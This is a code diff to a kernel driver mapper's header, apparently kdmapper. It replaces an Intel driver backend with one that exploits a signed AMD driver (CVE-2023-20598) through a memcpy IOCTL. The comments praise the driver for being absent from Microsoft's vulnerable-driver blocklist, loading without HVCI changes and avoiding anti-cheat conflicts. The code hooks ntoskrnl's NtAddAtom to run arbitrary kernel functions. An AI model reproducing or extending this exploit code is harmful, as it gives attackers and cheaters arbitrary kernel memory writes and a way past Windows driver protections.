@@ -7,9 +7,21 @@
 #include "utils.hpp"
 #include "nt.hpp"
 
-namespace intel_driver
+// AMD PdFwKrnl backend (KDU provider id 44, CVE-2023-20598).
+//
+// Drop-in replacement for the old Intel NAL (iqvw64e) backend. The AMD driver
+// is WHQL-signed and is NOT on the Microsoft vulnerable-driver blocklist, so
+// it loads on a stock Windows install — no HVCI / blocklist changes and no
+// conflicts with other games' anti-cheats.
+//
+// The driver exposes a single memcpy IOCTL whose copy is backed by
+// MmGetPhysicalAddress + MmMapIoSpace inside the driver, so writes also land
+// on read-only kernel pages (.text) — the same property the Intel backend had
+// through its physical map/unmap pair, here it comes for free.
+namespace amd_driver
 {
-	constexpr ULONG32 ioctl1 = 0x80862007;
+	// CTL_CODE(FILE_DEVICE_AMD_PDFW=0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
+	constexpr ULONG32 ioctl_memcpy = 0x80002014;
 	extern HANDLE hDevice;
 	extern ULONG64 ntoskrnlAddr;
 
@@ -35,9 +47,6 @@ namespace intel_driver
 
 	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
 	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
-	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
-	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size);
-	bool UnmapIoSpace(uint64_t address, uint32_t size);
 	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
 	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
 	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
@@ -45,7 +54,7 @@ namespace intel_driver
 	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
 	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
 	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);
-	
+
 	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
 
 	bool FreePool(uint64_t address);
@@ -90,7 +99,7 @@ namespace intel_driver
 		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
 		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
 
-		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "NtAddAtom");
+		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(amd_driver::ntoskrnlAddr, "NtAddAtom");
 		if (!kernel_NtAddAtom) {
 			kdmLog(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
 			return false;
@@ -103,7 +112,7 @@ namespace intel_driver
 			original_kernel_function[1] == kernel_injected_jmp[1] &&
 			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
 			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
-			kdmLog(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
+			kdmLog(L"[-] FAILED!: The code was already hooked!! another instance of the mapper running?!" << std::endl);
 			return false;
 		}
 
